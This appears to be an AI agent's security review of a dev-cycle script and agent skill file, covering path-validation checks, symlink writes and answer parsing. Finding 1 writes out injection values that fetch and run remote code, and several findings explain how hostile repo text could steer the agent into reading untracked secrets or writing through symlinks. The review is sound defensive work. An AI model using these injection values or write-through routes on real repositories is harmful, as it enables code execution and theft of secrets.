Commit: 1b0c4ff (A) / 462e561 (B)

# Security Review — dev-cycle pass 19 (pass-18 fix round, delta)

**Scope:** A: `git diff 36417f5..1b0c4ff -- scripts/dev-cycle.sh test/scripts/dev-cycle.bats` (wt-digest, commit 1b0c4ff). B: `git diff db24c74..462e561 -- skills/dev-cycle/SKILL.md docs/dev-cycle.md` (wt-devcycle, commit 462e561). Partial scope: everything else is context only.
**Date:** 2026-10-02
**Based on:** `docs/reviews/code-fact-check-report-digest-pass18.md` (Stage 1, loop pass 18, against 36417f5 / db24c74; it predates this round, so this round's claims were checked here by reading the whole enclosing units and by execution)

Probes: scratch under `/tmp/claude-1000/-workspace/dc1aa358-6e28-4b6b-8788-03dacd3f5ac7/scratchpad/sec19/` (below, `sec19/`). Throwaway repos were made with `mktemp -d` inside `sec19/` and removed. Every process ran under `timeout`; none is still running. Nothing was written to either worktree except this report.
- `sec19/a1b/`: `git archive 1b0c4ff scripts test`. `timeout 600 bats test/scripts/dev-cycle.bats`: exit 0, 24/24 ok (`sec19/bats.out`).
- `sec19/probe.sh` → `sec19/probe.out`: P1 `git ls-files --error-unmatch` on directories, a tracked file and an untracked `.env`; P1b a glob through a git pathspec; P2 the 1b0c4ff digest on records removed from the index; P3 committed absolute symlinks at `docs/roadmap.md` and `docs/working/idea-log.md`; P4 a symlinked `docs/working`; P5 a symlinked `questions-archive.md`.
- Ad hoc (same dir, removed): `ls-files --error-unmatch` with `core.ignorecase` true/false on a case-variant path (rc 1 both), and on `docs/./a.md` (rc 0).

## Trust Boundary Map

```
B1: [repo history + index: docs/decisions names]                 → [map miss → tracked check (git ls-files --error-unmatch, new) → git log -1] → [section 2 "last committed" evidence line]
B2: [repo file names: docs/working/cycles/cycle-*.md (skipped)]  → [skipped + date -d real-date guard (new)]                                    → [Window note "a newer record … was skipped"]
B3: [repo text: idea-source rows (globs)]                        → [check 1 charset → check 2 tracked → check 3 test -L (new, ordered)]          → [step 5 reads → idea log, roadmap (committed)]
B4: [repo text: paths in commit msgs, log rows, plans, questions] → [same checks 1-3, single-quoted (new)]                                        → [step 2/3/4 subagent reads → cycle record (committed)]
B5: [repo text: roadmap In-flight brief paths]                   → [brief pattern + checks 1-3]                                                   → [brief edits: Status, Kept, Applied, Asked]
B6: [repo tree: fixed-name files the cycle writes (roadmap, idea log, today's record, questions.md)] → [directories pass check 3 only (changed); digest section 8] → [cycle writes / appends]
B7: [repo tree: docs/, docs/working/, questions files]           → [section 8 listing → skip init/archive (new)]                                 → [questions.sh init + archive writes]
B8: [repo text: user answers in questions.md / archive]          → [first [1]/[2], else exact first word (new)]                                   → [brief Kept: / Status: closed]
```

Input-source classification:

```
S1: decision-record names, index state, history     — runtime-mutable (any merged commit) — UNTRUSTED for path/exec sinks; evidence-only display
S2: cycle-record file names                          — runtime-mutable — UNTRUSTED for exec/format sinks (shape + date -d before use)
S3: docs/dev-cycle.md idea-source rows (globs)       — runtime-mutable — UNTRUSTED for path construction and shell-command text
S4: paths named in commit messages, log rows, plans, questions — runtime-mutable — UNTRUSTED for path construction and shell-command text
S5: roadmap brief paths                              — runtime-mutable — UNTRUSTED for path construction (read AND write)
S6: tree entries at fixed names (docs/roadmap.md, docs/working/idea-log.md, cycle record, docs/, docs/working/) — runtime-mutable (a committed symlink) — UNTRUSTED for write-target resolution
S7: answers in questions.md / archive                — runtime-mutable — UNTRUSTED (repo text), treated by design as the user's answer for brief state only
S8: dev-cycle.sh, questions.sh (installed); the skill's fixed names — deploy-time / code-constant — trusted
```

Everything the cycle acts on is repo text or repo tree state that one merged commit can change. A narrows B1 (the fallback now runs only for indexed records) and B2 (the skipped-record note requires a real date); neither adds a sink. B replaces pass 18's text denylist with an ordered allowlist (charset, tracked, no symlink) for paths from repo text (B3–B5), quotes them, gates step 1's writes on section 8 (B7), and changes answer parsing (B8). The allowlist closes pass 18's findings 1–3 for literal file paths. Two gaps remain at its edges: a glob row (the only idea-source row this repo has) cannot pass check 1 as ordered, and check 2 accepts a directory. Separately, the rewrite scopes the cycle's own writes to "directories that pass check 3" (B6), and nothing ties the digest's section 8 to "do not write through" for the roadmap or idea log.

## Findings

#### 1. Check 1's character set excludes `*`, so the settings file's own glob row fails it; the only routes left are dropping the source or expanding an unchecked pattern in an unquoted shell command

**Severity:** Medium
**Location:** `skills/dev-cycle/SKILL.md:61-74` (462e561); `docs/dev-cycle.md:26-33` (462e561)
**Boundary:** B3
**Move:** 11 (bypass enumeration), 2 (implicit sanitization), 12 (process exec)
**Confidence:** Low (agent-behaviour dependent; the contradiction itself is High)
**Legibility-target:** agent
**Evidence (verbatim):** "A path taken from repo text (a settings row and its glob matches, …) is opened only if all of these hold, checked in this order: 1. it uses only letters, digits, `.`, `_`, `-` and `/` … 2. `git ls-files --error-unmatch -- '<path>'` accepts it, so it is a tracked file (expand a glob first, with the same check on each match); … Quote such a path in single quotes in every command." Settings: "| Feature ideas | docs/working/feature-ideas*.md | the self-improvement loop's idea files |".

The rule names glob rows as covered and says to expand them at check 2, but check 1 runs first and `*` is not in its set, so `docs/working/feature-ideas*.md` fails check 1 as written. The settings doc repeats the same charset directly above a column headed "Path or glob". An agent has two readings. (a) Apply check 1 to the pattern: the row fails, the repo's only idea source (`docs/working/feature-ideas.md`, tracked at 462e561) is skipped every cycle. That is a functional loss, not a security one. (b) Treat "expand a glob first" as preceding all checks, so check 1 applies only to matches. The pattern is then validated by nothing, and a glob cannot be expanded inside single quotes, so a shell expansion must leave it unquoted. A row such as ``docs/$(curl -s x.invalid|sh)*.md`` or `docs/a;id;*.md` then runs as shell text before any match is checked (pass 18 executed the same class for `test -L "…$(…)…"`). Reading (b) is the natural way to keep the source working, and it re-opens pass 18 finding 3 for S3. Preconditions: an attacker-chosen settings row (one merged commit), an agent that expands with the shell rather than the Glob tool, and a harness that does not prompt on `$(…)`. Each is uncertain, hence Low confidence; it is a named reachable mechanism, so Severity stays Medium under the floor rule.

**Recommendation:** Allow `*` and `?` in check 1 for a settings-row pattern only (still no leading `/` or `-`, no `..`, no `.git*` component), and expand it with `git ls-files -- '<pattern>'` (single-quoted; git matches the pathspec itself and returns tracked files only, so check 2 is met by construction; probe P1b returned only the tracked `feature-ideas.md`, not an untracked `feature-ideas-2.md`). Then apply checks 1 and 3 to each match. Say the same in `docs/dev-cycle.md`.

#### 2. Check 2 accepts a directory: `git ls-files --error-unmatch` succeeds for any directory holding a tracked file, so a named directory passes all three checks and its untracked files are reachable

**Severity:** Medium
**Location:** `skills/dev-cycle/SKILL.md:70-71` (462e561)
**Boundary:** B4 (also B3, B5)
**Move:** 5 (invert the allowlist), 11
**Confidence:** Low (executed for the check; the read that follows is agent-dependent)
**Legibility-target:** agent
**Evidence (verbatim):** "2. `git ls-files --error-unmatch -- '<path>'` accepts it, so it is a tracked file (expand a glob first, with the same check on each match);"

"So it is a tracked file" does not follow. Executed (P1): `git ls-files --error-unmatch -- 'docs'` and `-- 'docs/working'` both exit 0, while an untracked `.env` exits 1. In this repo, `git ls-files --error-unmatch -- devcontainer-config` exits 0 (it holds tracked scripts), and the `/workspace` checkout the cycle runs in has untracked `devcontainer-config/.env*` files right now (the session's git status). A commit message or plan that cites `devcontainer-config/` passes checks 1–3; a step 4 subagent that "reads the code path" lists or greps it, and the files it then opens come from a directory listing, not from repo text, so no check applies to them. That is pass 18 finding 2's untracked-secret read, reached one level up. Impact as in pass 18: content can reach the step 4 verdict and the committed cycle record. Precondition: attacker-chosen text naming a directory, and an agent that descends into it. Low confidence; named mechanism, so Medium.

**Recommendation:** Require a regular file: the path passes only if `git ls-files -- '<path>'` prints exactly that path (one line, equal to the input) and `test -f '<path>'` holds. Say that files found by listing a directory are not opened unless they pass the same checks.

#### 3. The rewrite checks only the directories of the files the cycle writes; a committed symlink at `docs/roadmap.md` or `docs/working/idea-log.md` is flagged by the digest, but nothing in the skill stops the write through it

**Severity:** Medium
**Location:** `skills/dev-cycle/SKILL.md:76-81` (462e561), with the writes at `:83-86` (seeding append), `:223-228` (brainstorm append, roadmap update), `:288` (record "update it in place")
**Boundary:** B6
**Move:** 4 (check vs. use), 12 (path write)
**Confidence:** Low (write-follow executed; harness behaviour on out-of-checkout targets not tested)
**Legibility-target:** agent
**Evidence (verbatim):** "Files the cycle creates (the record, a new brief, the idea log) use those fixed names, under directories that pass check 3. A path that fails is skipped and listed in the record under `## Skipped inputs`. The digest applies the same symlink rule to everything it reads … and lists what it skipped in its section 8." Replaced text (db24c74): "Then, before each read or write, check that no part of the path below the repo root is a symlink (`test -L` on each component; a file not yet created is checked through its directories)".

The db24c74 text asked for a per-component `test -L` before each write, with the "directories only" relaxation limited to a file not yet created. 462e561 states only "under directories that pass check 3" for the cycle's own files, and the existing `docs/roadmap.md`, `docs/working/idea-log.md` and an existing same-day record are edited or appended in place. Executed (P3): with committed absolute symlinks at both paths, the 1b0c4ff digest lists `- docs/roadmap.md` and `- docs/working/idea-log.md` in section 8, and an append to `docs/working/idea-log.md` lands in the out-of-checkout target. The skill routes section 8 only into the record's `## Skipped inputs`; "never read, copy or rewrite through them" appears only for skipped records (`:121`) and skipped questions files (`:178`), and step 1's new skip covers only questions.sh. So the cycle can overwrite (roadmap) or append to (idea log) any file the user can write: `~/.claude/settings.json`, `~/.bashrc`, or `.git/config` via an in-repo link. Content is the cycle's roadmap and idea lines, partly derived from repo text. A same-day record symlink is covered by the `:121` rule only when the digest names it as a newer skipped record. Preconditions: a merged commit adding the symlink (git shows `new file mode 120000`, easy to miss), and a harness that does not refuse a write resolved outside the checkout. Low confidence; named, executed mechanism, so Medium.

**Recommendation:** Apply check 3 to every component, the file included, before each write of a fixed-name file that exists, and add one sentence: "never read, write or append through a path the digest's section 8 lists; note it in the record instead." (This also gives step 1's skip and step 3's rule one general source.)

#### 4. The digest prints "never, uncommitted" for a quoted-name record that was committed and later removed from the index, and its comment says such a record "was never committed here"

**Severity:** Informational
**Location:** `scripts/dev-cycle.sh:231-236` (1b0c4ff)
**Boundary:** B1
**Move:** 3 (error path)
**Confidence:** High (executed)
**Legibility-target:** maintainer
**Evidence (verbatim):** "# Fall back only for a tracked record (an index lookup, no history walk): an # untracked one was never committed here, and a full walk to prove it cost # ~1 s per record on a 220k-commit repo."

P2: records `001-gone.md` and `002-q"x.md` were committed, then `git rm --cached` (still on disk). The digest prints `001-gone.md (last committed on this branch: 2026-02-03)` (the map has the deletion commit) and `002-q"x.md (last committed on this branch: never, uncommitted)`, while per-file `git log -1` gives 2026-02-03 for both. Untracked does not imply never committed. The trigger text is still printed in full, so no input is hidden; only the evidence line for step 2 is wrong for this rare shape (a quoted name plus an index removal). Not a security issue. The other two cases the brief names hold: quoted tracked names get their per-file date (bats test 11, passing at 1b0c4ff) and an untracked new record prints "never, uncommitted" without a walk (the same test's `005-uncommitted.md`).

**Recommendation:** Reword the comment to "an untracked one is not on this branch now (it may have been, then removed)", or print "not tracked" instead of "never, uncommitted" when the fallback is skipped.

#### 5. Keep-or-drop answers: "2 more weeks" still closes the brief

**Severity:** Informational
**Location:** `skills/dev-cycle/SKILL.md:253-259` (462e561)
**Boundary:** B8
**Move:** 5
**Confidence:** High (read-static)
**Legibility-target:** agent
**Evidence (verbatim):** "read the option the user chose: the first `[1]` or `[2]` in their answer (as in `Q-NNN: [1]`), or, if there is none, its first word when that is exactly `1`, `keep`, `2` or `drop` (any case). `[1]`, `1` or `keep` sets `Kept: <today>` (YYYY-MM-DD); `[2]`, `2` or `drop` closes the brief as in 1;"

Traced on the brief's examples: `Q-012: [2]` → drop (correct); `[1] keep, it's close` → keep (correct); `2 more weeks` → no bracket, first word exactly `2` → drop, which is likely the opposite of intent (pass 18 finding 6's example, unchanged). Also `not [2], [1]` → drop. Closing a brief is reversible, answers are repo text by design (S7), and unrecognized answers are now added to `Applied:` once and listed, which fixes pass 18's re-noting. This is an accuracy issue, not a security property. The new slug `keep-or-drop-<brief file name without .md>-<n>` inherits the brief name's fixed character set, so it adds nothing for questions.sh to parse.

**Recommendation:** Accept a bare first word only when it is the whole answer (after the `Q-NNN:` prefix), e.g. `2` or `drop` alone; list anything longer without a bracket as unrecognized.

## Untested bypass candidates

For the checks 1–3 guardrail (move 11):
- **NTFS forms `GIT~1`, `.git.`, `.git::$INDEX_ALLOCATION`** (Windows only). Check 1 rejects `:` and the leading-`.git` forms; `GIT~1` passes check 1 but would also need to pass check 2 (no index entry has that name). Not executed: no Windows host.
- **A pattern with shell metacharacters under reading (b) of finding 1.** Not executed against an agent; the shell behaviour itself was executed in pass 18.
- **An agent that applies check 2 with a different git command (e.g. `git ls-files` without `--error-unmatch`, which exits 0 on no match).** Depends on agent fidelity to the quoted command; not tested.

Traced, not left open:
- Non-ASCII "letters" (e.g. `é`, homoglyphs): inside single quotes no shell meaning; check 2 still requires an exact index entry. Display confusion only.
- Case variants: `.GIT`, `.Git` fail check 1 ("any case"); `DOCS/A.md` against tracked `docs/a.md` fails check 2 with `core.ignorecase` false and true (executed).
- `docs/./a.md`: passes checks 1–2 (executed, rc 0) and names the same tracked file; harmless.
- Leading `-` and leading `/`: rejected by check 1; `--` precedes the path in check 2.
- Untracked `.env`: fails check 2 (executed, rc 1), closing pass 18 finding 2 for file paths (finding 2 above is the directory case).
- Single quote in a path: not in the set, so single-quoting cannot be broken out of.

## Endorsement Claims

- **Claim:** For a literal path (no glob) that is a regular file, checks 1–3 as ordered admit only tracked files with no symlink component and no `..`, `.git*` (any case), leading `/` or leading `-`, and the single-quoting cannot be escaped because `'` is outside the set.
  **Location:** `skills/dev-cycle/SKILL.md:68-74` (462e561)
  **Evidence:** read-static, with check 2 executed on a tracked file, an untracked `.env` and a case variant
  **Verified:** the charset text; `ls-files --error-unmatch` results in P1 and the ad hoc case probe.
  **Not verified:** directory paths (finding 2) and glob rows (finding 1); how a subagent actually forms the commands.
  **route: code-fact-check**
- **Claim:** Step 1's skip condition matches what the digest prints: a symlinked `docs/working` is listed as `- docs/working/`, a symlinked archive as `- docs/working/questions-archive.md`, so an agent comparing section 8 lines to "`docs/`, `docs/working/` or a questions file" skips both questions.sh commands in each case.
  **Location:** `skills/dev-cycle/SKILL.md:138-143` (462e561); `scripts/dev-cycle.sh:271-285, 403-410` (1b0c4ff, context)
  **Evidence:** executed (P4, P5)
  **Verified:** the digest's section 8 lines for those two shapes.
  **Not verified:** the `docs/` shape (`- docs/`) was not re-run this pass (pass 18 executed it); a symlinked `docs/working/questions.md` (same `skipped` path, not re-run).
  **route: code-fact-check**
- **Claim:** The fallback lookup runs only when `git ls-files --error-unmatch -- "$f"` accepts the record, with `--` and `GIT_LITERAL_PATHSPECS=1` exported, and an untracked new record prints "never, uncommitted" without a history walk.
  **Location:** `scripts/dev-cycle.sh:228-236` (1b0c4ff)
  **Evidence:** executed (bats 24/24 at 1b0c4ff; P2)
  **Verified:** test 11's `005-uncommitted.md` assertion and the quoted-name per-file comparisons; P2's two removed-from-index records.
  **Not verified:** the cost of many tracked quoted names (each still a full walk); a mutation run showing test 11 fails if the tracked check is removed.
  **route: code-fact-check**
- **Claim:** The skipped-record note now requires a real date: `date -d "$d"` runs after `skipped "$f"` has already added the path to section 8, so an impossible-date symlinked record is still listed but no longer named in the Window note.
  **Location:** `scripts/dev-cycle.sh:154-160` (1b0c4ff)
  **Evidence:** read-static
  **Verified:** the `&&` chain order in the whole loop (`:152-165`).
  **Not verified:** no test covers this branch (bats has no symlinked impossible-date record).
  **route: code-fact-check**

## Primitive sweep

Primitive: path read/write from repo text or repo tree (skill level)
| Call site | Source | Guard | Disposition |
|---|---|---|---|
| `SKILL.md:219-221` step 5 idea-source globs | S3 | checks 1–3 (pattern cannot pass check 1) | Finding 1 |
| `SKILL.md:183-188` step 4 claim reads (message, log row, plan) | S4 | checks 1–3, single-quoted | Finding 2 (directory); literal files: endorsement 1 |
| `SKILL.md:155-162` step 2 evidence reads | S1, S4 | same | Finding 2 |
| `SKILL.md:168-179` step 3 question-named files | S4 | same | Finding 2 |
| `SKILL.md:245-266` In-flight brief reads/edits | S5 | brief pattern + checks 1–3 | cleared: pattern confines to `docs/working/briefs/`, tracked, no symlink |
| `SKILL.md:276-284` new brief write | code-constant + constrained slug | directories pass check 3 | cleared: fixed directory, new file |
| `SKILL.md:83-86, 223-224` idea-log append | S6 | directories only | Finding 3 |
| `SKILL.md:228` roadmap update | S6 | directories only | Finding 3 |
| `SKILL.md:288` record "update it in place" | S6, S2 | directories only; `:121` if digest names it | Finding 3 (partly covered) |
| `SKILL.md:138-143` questions.sh init/archive | S6 | section-8 skip (new) + questions.sh file/dir `-L` | cleared: endorsement 2 |

Primitive: process exec with repo-derived arguments
| Call site | Source | Guard | Disposition |
|---|---|---|---|
| `SKILL.md:70` `git ls-files --error-unmatch -- '<path>'` | S3, S4, S5 | check 1 charset, single quotes, `--` | cleared for literals; Finding 1 for glob patterns |
| `SKILL.md:72` `test -L '<part>'` | S3, S4, S5 | check 1 charset, single quotes | cleared (pass 18 finding 3 closed for literals) |
| `dev-cycle.sh:234` `git ls-files --error-unmatch -- "$f"` | S1 | glob-derived `docs/decisions/` prefix, `--`, literal pathspecs | cleared |
| `dev-cycle.sh:235` `git log -1 … -- "$f"` | S1 | same | cleared |
| `dev-cycle.sh:158` `date -d "$d"` (skipped branch) | S2 | glob shape: digits and hyphens | cleared |

## Summary Table

| # | Finding | Severity | Boundary | Location | Confidence |
|---|---------|----------|----------|----------|------------|
| 1 | Check 1 excludes `*`; the settings file's glob row fails it, or the pattern is expanded unchecked and unquoted | Medium | B3 | `SKILL.md:61-74`; `docs/dev-cycle.md:26-33` | Low |
| 2 | Check 2 accepts a directory (`devcontainer-config` here); untracked files under it become reachable | Medium | B4 | `SKILL.md:70-71` | Low |
| 3 | Cycle's own writes check directories only; symlinked roadmap / idea log flagged in section 8 but written through | Medium | B6 | `SKILL.md:76-81` (+ write sites) | Low |
| 4 | Removed-from-index quoted record prints "never, uncommitted"; comment's "never committed" overstates | Informational | B1 | `dev-cycle.sh:231-236` | High |
| 5 | "2 more weeks" still parses as drop | Informational | B8 | `SKILL.md:253-259` | High |

## Overall Assessment

A is clean for security: the tracked-only fallback adds one literal-pathspec `git ls-files` call and no new sink, untracked records no longer walk history, and the skipped-record note now requires a real date (24/24 bats). Its comment overstates "never committed" for a removed-from-index record (finding 4, accuracy only). B closes pass 18's four Medium findings for their stated shapes: the ordered allowlist rejects `.git` case variants, untracked `.env` files and shell metacharacters in literal paths, and step 1 now skips questions.sh on exactly the section-8 lines the digest prints (executed). Three Medium findings remain, all fixable in place in the skill text and all needing a hostile merged commit (Low confidence in a solo repo): the charset makes the repo's own glob row either unusable or unvalidated (finding 1); check 2 lets a directory through (finding 2); and the rewrite dropped the last-component symlink check for the cycle's own existing files, while the digest's section 8 is not tied to "do not write through" for the roadmap and idea log (finding 3, executed). The single most important fix is finding 3's one sentence: never read, write or append through any path section 8 lists, and `test -L` every component, the file included, before writing an existing file. No other findings within the code paths read; endorsement claims are pending execution verification where marked `route: code-fact-check`. This delta pass is not clean.

## Goal-Alignment Note

Success criterion (verbatim): "a markdown report saved at the path your role instructions give, structured per your skill file."

This report is saved at `/workspace/.claude/wt-digest/docs/reviews/security-review-2026-10-02-digest-pass19.md`, first line `Commit: 1b0c4ff (A) / 462e561 (B)`. It follows the security-reviewer skill: Trust Boundary Map with a source table, Findings (each with Severity, Location, Evidence verbatim, Confidence, Legibility-target), Untested bypass candidates, Endorsement Claims routed `route: code-fact-check`, Primitive sweep, Summary Table and Overall Assessment. It answers brief claim 1 (tracked-only fallback across quoted, untracked and removed-from-index records; the comment; tests) and claim 2 (the path rule per path class including the idea log, records, briefs and this repo's idea source; step 1 against what the digest prints; answer parsing on the three named answers; the slug). Toward the user's goal of a clean pass before merging: this pass is not clean (three Medium, two Informational). Nothing was committed.
